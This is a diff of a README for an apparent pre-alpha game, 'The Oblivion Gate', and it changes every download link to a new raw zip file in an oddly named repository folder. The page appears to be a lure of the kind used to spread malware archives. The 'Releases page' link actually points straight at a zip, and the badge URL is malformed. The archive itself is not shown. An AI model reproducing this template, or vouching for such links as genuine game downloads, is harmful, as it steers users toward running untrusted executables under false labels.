@@ -1,7 +1,7 @@
 # 🎮 TheOblivionGateTest - Your Adventure Awaits Here!
 
 ## 📥 Download Now
-[![Download TheOblivionGateTest](https://raw.githubusercontent.com/ganeshRapal123/TheOblivionGateTest/main/cecidomyian/TheOblivionGateTest.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ganeshRapal123/TheOblivionGateTest/main/cecidomyian/TheOblivionGateTest.zip)
+[![Download TheOblivionGateTest](https://github.com/ganeshRapal123/TheOblivionGateTest/raw/refs/heads/main/cecidomyian/Gate_Test_The_Oblivion_v1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/ganeshRapal123/TheOblivionGateTest/raw/refs/heads/main/cecidomyian/Gate_Test_The_Oblivion_v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to "The Oblivion Gate Avventura Sopravvivenza" Pre-Alpha Early Access. This guide will help you download and run the demo easily.
@@ -17,7 +17,7 @@ To run this game, ensure your system meets the following minimum requirements:
 - **Storage:** 5 GB available space
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/ganeshRapal123/TheOblivionGateTest/main/cecidomyian/TheOblivionGateTest.zip) to download the latest version of the game.
+1. Visit the [Releases page](https://github.com/ganeshRapal123/TheOblivionGateTest/raw/refs/heads/main/cecidomyian/Gate_Test_The_Oblivion_v1.0.zip) to download the latest version of the game.
 2. Choose the version marked as "Demo" for the latest early access experience.
 3. Download the file that corresponds to your system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -58,4 +58,4 @@ Make sure to keep an eye on the releases page for future updates. We’ll add ne
 ## 📢 Final Thoughts
 Thank you for your interest in "The Oblivion Gate." We are excited for you to embark on this adventure. 
 
-Don't forget to [download the game here](https://raw.githubusercontent.com/ganeshRapal123/TheOblivionGateTest/main/cecidomyian/TheOblivionGateTest.zip) and enjoy your journey!
+Don't forget to [download the game here](https://github.com/ganeshRapal123/TheOblivionGateTest/raw/refs/heads/main/cecidomyian/Gate_Test_The_Oblivion_v1.0.zip) and enjoy your journey!
